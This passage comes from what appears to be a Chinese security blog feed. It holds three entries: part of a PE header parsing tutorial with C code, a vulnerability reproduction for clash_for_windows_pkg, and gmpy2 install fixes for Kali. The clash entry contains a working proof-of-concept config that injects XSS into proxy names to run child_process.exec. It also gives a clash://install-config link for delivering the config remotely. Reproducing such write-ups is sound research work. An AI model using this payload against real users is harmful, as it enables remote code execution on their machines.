keyword">define</span> <span class="token macro-name">IMAGE_FILE_SYSTEM</span>                    <span class="token expression"><span class="token number">0x1000</span>  </span><span class="token comment">// System File.</span></span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_DLL</span>                       <span class="token expression"><span class="token number">0x2000</span>  </span><span class="token comment">// File is a DLL.</span></span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_UP_SYSTEM_ONLY</span>            <span class="token expression"><span class="token number">0x4000</span>  </span><span class="token comment">// File should only be run on a UP machine</span></span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_BYTES_REVERSED_HI</span>         <span class="token expression"><span class="token number">0x8000</span>  </span><span class="token comment">// Bytes of machine word are reversed.</span></span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_UNKNOWN</span>           <span class="token expression"><span class="token number">0</span></span></span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_TARGET_HOST</span>       <span class="token expression"><span class="token number">0x0001</span>  </span><span class="token comment">// Useful for indicating we want to interact with the host and not a WoW guest.</span></span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_I386</span>              <span class="token expression"><span class="token number">0x014c</span>  </span><span class="token comment">// Intel 386.</span></span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_R3000</span>             <span class="token expression"><span class="token number">0x0162</span>  </span><span class="token comment">// MIPS little-endian, 0x160 big-endian</span></span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_R4000</span>             <span class="token expression"><span class="token number">0x0166</span>  </span><span class="token comment">// MIPS little-endian</span></span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_R10000</span>            <span class="token expression"><span class="token number">0x0168</span>  </span><span class="token comment">// MIPS little-endian</span></span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_WCEMIPSV2</span>         <span class="token expression"><span class="token number">0x0169</span>  </span><span class="token comment">// MIPS little-endian WCE v2</span></span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_ALPHA</span>             <span class="token expression"><span class="token number">0x0184</span>  </span><span class="token comment">// Alpha_AXP</span></span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_SH3</span>               <span class="token expression"><span class="token number">0x01a2</span>  </span><span class="token comment">// SH3 little-endian</span></span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_SH3DSP</span>            <span class="token expression"><span class="token number">0x01a3</span></span></span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_SH3E</span>              <span class="token expression"><span class="token number">0x01a4</span>  </span><span class="token comment">// SH3E little-endian</span></span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_SH4</span>               <span class="token expression"><span class="token number">0x01a6</span>  </span><span class="token comment">// SH4 little-endian</span></span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_SH5</span>               <span class="token expression"><span class="token number">0x01a8</span>  </span><span class="token comment">// SH5</span></span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_ARM</span>               <span class="token expression"><span class="token number">0x01c0</span>  </span><span class="token comment">// ARM Little-Endian</span></span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_THUMB</span>             <span class="token expression"><span class="token number">0x01c2</span>  </span><span class="token comment">// ARM Thumb/Thumb-2 Little-Endian</span></span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_ARMNT</span>             <span class="token expression"><span class="token number">0x01c4</span>  </span><span class="token comment">// ARM Thumb-2 Little-Endian</span></span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_AM33</span>              <span class="token expression"><span class="token number">0x01d3</span></span></span></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_POWERPC</span>           <span class="token expression"><span class="token number">0x01F0</span>  </span><span class="token comment">// IBM PowerPC Little-Endian</span></span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_POWERPCFP</span>         <span class="token expression"><span class="token number">0x01f1</span></span></span></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_IA64</span>              <span class="token expression"><span class="token number">0x0200</span>  </span><span class="token comment">// Intel 64</span></span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_MIPS16</span>            <span class="token expression"><span class="token number">0x0266</span>  </span><span class="token comment">// MIPS</span></span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_ALPHA64</span>           <span class="token expression"><span class="token number">0x0284</span>  </span><span class="token comment">// ALPHA64</span></span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_MIPSFPU</span>           <span class="token expression"><span class="token number">0x0366</span>  </span><span class="token comment">// MIPS</span></span></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_MIPSFPU16</span>         <span class="token expression"><span class="token number">0x0466</span>  </span><span class="token comment">// MIPS</span></span></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_AXP64</span>             <span class="token expression">IMAGE_FILE_MACHINE_ALPHA64</span></span></pre></td></tr><tr><td data-num="41"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_TRICORE</span>           <span class="token expression"><span class="token number">0x0520</span>  </span><span class="token comment">// Infineon</span></span></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_CEF</span>               <span class="token expression"><span class="token number">0x0CEF</span></span></span></pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_EBC</span>               <span class="token expression"><span class="token number">0x0EBC</span>  </span><span class="token comment">// EFI Byte Code</span></span></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_AMD64</span>             <span class="token expression"><span class="token number">0x8664</span>  </span><span class="token comment">// AMD64 (K8)</span></span></pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_M32R</span>              <span class="token expression"><span class="token number">0x9041</span>  </span><span class="token comment">// M32R little-endian</span></span></pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_ARM64</span>             <span class="token expression"><span class="token number">0xAA64</span>  </span><span class="token comment">// ARM64 Little-Endian</span></span></pre></td></tr><tr><td data-num="47"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_CEE</span>               <span class="token expression"><span class="token number">0xC0EE</span></span></span></pre></td></tr></table></figure><p><code>typedef struct _IMAGE_OPTIONAL_HEADER</code>  定义</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213074527728.png" alt="image-20220213074527728" /></p>
<p>AddressOfEntryPoint：程序入口，当前 PE 文件从哪个位置开始执行，配合 ImageBase (内存镜像基址) 来看</p>
<ul>
<li>VA：Virtual Adress 00000000h-0fffffffh 进程的基地址 + 相对虚拟内存地址</li>
<li>RVA ：Reversc Virtual Adress 相对虚拟内存地址 针对某一个模块而存在</li>
<li>FOA：File Offset Address 文件偏移地址</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:left">成员</th>
<th style="text-align:left">大小 (十进制)</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Magic</td>
<td style="text-align:left">2 字节</td>
<td style="text-align:left">PE32：10B、PE32+(64)：20B，可以用来确认是 32 位还是 64 位程序</td>
</tr>
<tr>
<td style="text-align:left">MajorLinkerVersion</td>
<td style="text-align:left">1 字节</td>
<td style="text-align:left">链接器版本号</td>
</tr>
<tr>
<td style="text-align:left">MinorLinkerVersion</td>
<td style="text-align:left">1 字节</td>
<td style="text-align:left">链接器版本号</td>
</tr>
<tr>
<td style="text-align:left">SizeOfCode</td>
<td style="text-align:left">4 字节</td>
<td style="text-align:left">所有代码节的总和，文件对齐后的大小，由编译器填写</td>
</tr>
<tr>
<td style="text-align:left">SizeOfInitializedData</td>
<td style="text-align:left">4 字节</td>
<td style="text-align:left">包含所有已经初始化数据的节的总大小，文件对齐后的大小，由编译器填写</td>
</tr>
<tr>
<td style="text-align:left">AddressOfEntryPoint</td>
<td style="text-align:left">4 字节</td>
<td style="text-align:left">程序入口，当前 PE 文件从哪个位置开始执行，配合 ImageBase (内存镜像基址) 来看</td>
</tr>
</tbody>
</table>
<h3 id="执行程序"><a class="anchor" href="#执行程序">#</a> 执行程序</h3>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213075850476.png" alt="image-20220213075850476" /></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	FILE <span class="token operator">*</span> pFile <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	<span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token keyword">int</span> nFileLength <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	pFile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"C:\\Users\\21r000\\Desktop\\PE编辑器\\PEditor.exe"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	<span class="token function">fseek</span><span class="token punctuation">(</span>pFile<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">SEEK_END</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	nFileLength <span class="token operator">=</span> <span class="token function">ftell</span><span class="token punctuation">(</span>pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token function">rewind</span><span class="token punctuation">(</span>pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	<span class="token keyword">int</span> imageLength <span class="token operator">=</span> nFileLength <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	buffer <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>imageLength<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>	<span class="token function">memset</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> nFileLength <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>	<span class="token function">fread</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> imageLength<span class="token punctuation">,</span> pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>	<span class="token comment">//MS-DOS</span></pre></td></tr><tr><td data-num="18"></td><td><pre>	<span class="token comment">//_IMAGE_DOS_HEADER</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	PIMAGE_DOS_HEADER ReadDosHeader<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	ReadDosHeader <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"MS-DOS Info:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"MZ标志位：%x\n"</span><span class="token punctuation">,</span> ReadDosHeader<span class="token operator">-></span>e_magic<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"PE头偏移：%x\n"</span><span class="token punctuation">,</span> ReadDosHeader<span class="token operator">-></span>e_lfanew<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	<span class="token comment">//PE</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	<span class="token comment">//_IMAGE_NT_HEADERS</span></pre></td></tr><tr><td data-num="26"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"PE Header Info:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>	PIMAGE_NT_HEADERS ReadNTHeaders<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>	ReadNTHeaders <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span>buffer <span class="token operator">+</span> ReadDosHeader<span class="token operator">-></span>e_lfanew<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"PE标志位：%x\n"</span><span class="token punctuation">,</span> ReadNTHeaders<span class="token operator">-></span>Signature<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"运行平台：%x\n"</span><span class="token punctuation">,</span> ReadNTHeaders<span class="token operator">-></span>FileHeader<span class="token punctuation">.</span>Machine<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ImageBase：%x\n"</span><span class="token punctuation">,</span> ReadNTHeaders<span class="token operator">-></span>OptionalHeader<span class="token punctuation">.</span>ImageBase<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre></pre></td></tr><tr><td data-num="33"></td><td><pre>	<span class="token function">free</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h3 id="运行结果-2"><a class="anchor" href="#运行结果-2">#</a> 运行结果</h3>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213075943206.png" alt="image-20220213075943206" /></p>
]]></content>
      <categories>
        <category>PE文件结构解析</category>
      </categories>
      <tags>
        <tag>PE文件结构解析</tag>
      </tags>
  </entry>
  <entry>
    <title>clash_for_windows_pkg RCE</title>
    <url>/article/4120caeb.html</url>
    <content><![CDATA[<h2 id="描述"><a class="anchor" href="#描述">#</a> 描述</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZuZHJvaWQvY2xhc2hfZm9yX3dpbmRvd3NfcGtn">clash_for_windows_pkg</span> 由 Electron 提供。如果 XSS 负载以代理的名义存在，我们可以在受害者的计算机上远程执行任何 JavaScript 代码。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220225172245405.png" alt="image-20220225172245405" /></p>
<h2 id="受影响版本的clash_for_windows_pkg"><a class="anchor" href="#受影响版本的clash_for_windows_pkg">#</a> 受影响版本的 clash_for_windows_pkg</h2>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>version: <span class="token number">0.19</span>.8</pre></td></tr><tr><td data-num="2"></td><td><pre>Platform: Windows</pre></td></tr><tr><td data-num="3"></td><td><pre>OS specifics: Windows <span class="token number">10</span></pre></td></tr></table></figure><h2 id="poc"><a class="anchor" href="#poc">#</a> PoC</h2>
<ol>
<li>导入以下 clash 配置文件：</li>
</ol>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>port<span class="token punctuation">:</span> <span class="token number">7890</span></pre></td></tr><tr><td data-num="2"></td><td><pre>socks<span class="token operator">-</span>port<span class="token punctuation">:</span> <span class="token number">7891</span></pre></td></tr><tr><td data-num="3"></td><td><pre>allow<span class="token operator">-</span>lan<span class="token punctuation">:</span> <span class="token constant boolean">true</span></pre></td></tr><tr><td data-num="4"></td><td><pre>mode<span class="token punctuation">:</span> Rule</pre></td></tr><tr><td data-num="5"></td><td><pre>log<span class="token operator">-</span>level<span class="token punctuation">:</span> info</pre></td></tr><tr><td data-num="6"></td><td><pre>external<span class="token operator">-</span>controller<span class="token punctuation">:</span> <span class="token punctuation">:</span><span class="token number">9090</span></pre></td></tr><tr><td data-num="7"></td><td><pre>proxies<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token operator">-</span> name<span class="token punctuation">:</span> a<span class="token operator">&lt;</span>img<span class="token operator">/</span>src<span class="token operator">=</span><span class="token string double-quoted-string">"1"</span><span class="token operator">/</span>onerror<span class="token operator">=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string backtick-quoted-string">`require("child_process").exec("calc.exe");`</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span></pre></td></tr><tr><td data-num="9"></td><td><pre>    type<span class="token punctuation">:</span> socks5</pre></td></tr><tr><td data-num="10"></td><td><pre>    server<span class="token punctuation">:</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    port<span class="token punctuation">:</span> <span class="token string double-quoted-string">"17938"</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    skip<span class="token operator">-</span>cert<span class="token operator">-</span>verify<span class="token punctuation">:</span> <span class="token constant boolean">true</span></pre></td></tr><tr><td data-num="13"></td><td><pre>  <span class="token operator">-</span> name<span class="token punctuation">:</span> abc</pre></td></tr><tr><td data-num="14"></td><td><pre>    type<span class="token punctuation">:</span> socks5</pre></td></tr><tr><td data-num="15"></td><td><pre>    server<span class="token punctuation">:</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    port<span class="token punctuation">:</span> <span class="token string double-quoted-string">"8088"</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    skip<span class="token operator">-</span>cert<span class="token operator">-</span>verify<span class="token punctuation">:</span> <span class="token constant boolean">true</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>proxy<span class="token operator">-</span>groups<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>  <span class="token operator">-</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    name<span class="token punctuation">:</span> <span class="token operator">&lt;</span>img<span class="token operator">/</span>src<span class="token operator">=</span><span class="token string double-quoted-string">"1"</span><span class="token operator">/</span>onerror<span class="token operator">=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string backtick-quoted-string">`require("child_process").exec("calc.exe");`</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span></pre></td></tr><tr><td data-num="22"></td><td><pre>    type<span class="token punctuation">:</span> select</pre></td></tr><tr><td data-num="23"></td><td><pre>    proxies<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token operator">-</span> a<span class="token operator">&lt;</span>img<span class="token operator">/</span>src<span class="token operator">=</span><span class="token string double-quoted-string">"1"</span><span class="token operator">/</span>onerror<span class="token operator">=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string backtick-quoted-string">`require("child_process").exec("calc.exe");`</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span></pre></td></tr></table></figure><ol start="2">
<li>在 “配置文件” 中切换到它</li>
<li>单击 “代理” 列（有时不需要）</li>
</ol>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220225172446921.png" alt="image-20220225172446921" /></p>
<p>弹出 calc</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220225172150724.png" alt="image-20220225172150724" /></p>
<p><strong>注意:</strong></p>
<ul>
<li>您需要确保有效负载显示在代理列中。</li>
<li>该漏洞理论上是稳定的，但有时可能需要重新启动 clash_for_windows_pkg 并复制该漏洞</li>
</ul>
<h2 id="a-way-to-exploit"><a class="anchor" href="#a-way-to-exploit">#</a> A way to Exploit</h2>
<p>将配置文件放到浏览器上使用  <code>clash://</code>  安装它，clash_for_windows_pkg 将自动下载并切换到它。</p>
<p>例如：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>clash://install-config?url<span class="token operator">=</span>http%3A%2F%2F1.1.1.1%3A8888%2F1.txt<span class="token operator">&amp;</span><span class="token assign-left variable">name</span><span class="token operator">=</span>RCE</pre></td></tr></table></figure>]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>kali 安装gmpy2报错问题总结</title>
    <url>/article/9f3a01f6.html</url>
    <content><![CDATA[<h2 id="1缺失依赖包问题"><a class="anchor" href="#1缺失依赖包问题">#</a> 1. 缺失依赖包问题</h2>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211205131630193.png" alt="image-20211205131630193" /></p>
<p>原因是缺少了一些系统依赖，分别是： <code>gmp</code>   <code>mpfr</code>   <code>mpc</code> <br />
 安装以下依赖就可以完成安装 <code>gmpy2</code> ：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>apt<span class="token operator">-</span><span class="token keyword">get</span> install libgmp<span class="token operator">-</span>dev</pre></td></tr><tr><td data-num="2"></td><td><pre>apt<span class="token operator">-</span><span class="token keyword">get</span> install libmpfr<span class="token operator">-</span>dev</pre></td></tr><tr><td data-num="3"></td><td><pre>apt<span class="token operator">-</span><span class="token keyword">get</span> install libmpc<span class="token operator">-</span>dev</pre></td></tr></table></figure><h2 id="2缺失python的头文件和静态库包问题"><a class="anchor" href="#2缺失python的头文件和静态库包问题">#</a> 2. 缺失 python 的头文件和静态库包问题</h2>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211205132023479.png" alt="image-20211205132023479" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>sudo apt<span class="token operator">-</span><span class="token keyword">get</span> install python3<span class="token operator">-</span>dev</pre></td></tr></table></figure><h2 id="3下载中断问题"><a class="anchor" href="#3下载中断问题">#</a> 3. 下载中断问题</h2>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211205132422798.png" alt="image-20211205132422798" /></p>
<p>尝试换源后，重新下载。</p>
<p>PS: 换源要注意备份！</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>vim <span class="token operator">/</span>etc<span class="token operator">/</span>apt<span class="token operator">/</span>sources<span class="token punctuation">.</span>list</pre></td></tr></table></figure><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>#阿里云</pre></td></tr><tr><td data-num="2"></td><td><pre>deb http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>mirrors<span class="token punctuation">.</span>aliyun<span class="token punctuation">.</span>com<span class="token operator">/</span>kali kali<span class="token operator">-</span>rolling main non<span class="token operator">-</span>free contrib</pre></td></tr><tr><td data-num="3"></td><td><pre>deb<span class="token operator">-</span>src http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>mirrors<span class="token punctuation">.</span>aliyun<span class="token punctuation">.</span>com<span class="token operator">/</span>kali kali<span class="token operator">-</span>rolling main non<span class="token operator">-</span>free contrib</pre></td></tr><tr><td data-num="4"></td><td><pre>deb http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>mirrors<span class="token punctuation">.</span>aliyun<span class="token punctuation">.</span>com<span class="token operator">/</span>kali<span class="token operator">-</span>security kali<span class="token operator">-</span>rolling<span class="token operator">/</span>updates main contrib non<span class="token operator">-</span>free</pre></td></tr><tr><td data-num="5"></td><td><pre>#中科大</pre></td></tr><tr><td data-num="6"></td><td><pre>deb http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>mirrors<span class="token punctuation">.</span>ustc<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn<span class="token operator">/</span>kali kali<span class="token operator">-</span>rolling main non<span class="token operator">-</span>free contrib</pre></td></tr><tr><td data-num="7"></td><td><pre>deb<span class="token operator">-</span>src http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>mirrors<span class="token punctuation">.</span>ustc<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn<span class="token operator">/</span>kali kali<span class="token operator">-</span>rolling main non<span class="token operator">-</span>free contrib</pre></td></tr></table></figure>]]></content>
      <categories>
